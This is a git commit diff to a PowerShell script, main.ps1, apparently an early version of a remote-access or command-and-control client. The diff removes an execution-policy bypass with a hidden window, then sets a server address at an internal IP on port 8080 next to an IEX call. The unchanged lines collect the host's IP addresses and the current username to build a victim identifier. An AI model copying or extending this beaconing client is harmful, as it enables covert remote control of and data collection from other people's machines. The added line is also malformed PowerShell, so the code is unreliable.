ece6ea7ac1035d56d522b4ef58419979e3b7855c
mehmetdere <105990633+mehmetdere@users.noreply.github.com>
2022-09-08 21:56:07 +0300

    v0.3

--- main.ps1
+++ main.ps1
@@ -1,5 +1,4 @@
-powershell -exec bypass -WindowStyle Hidden IEX 
-$server = 'http://192.168.1.49:8080/'
+powershell IEX $server = 'http://192.168.1.49:8080/'
 $ip		= get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1} 
 $user 	= (whoami).split('\')[1]
 $id 	= $ip.ipaddress[0]+'.'+$user
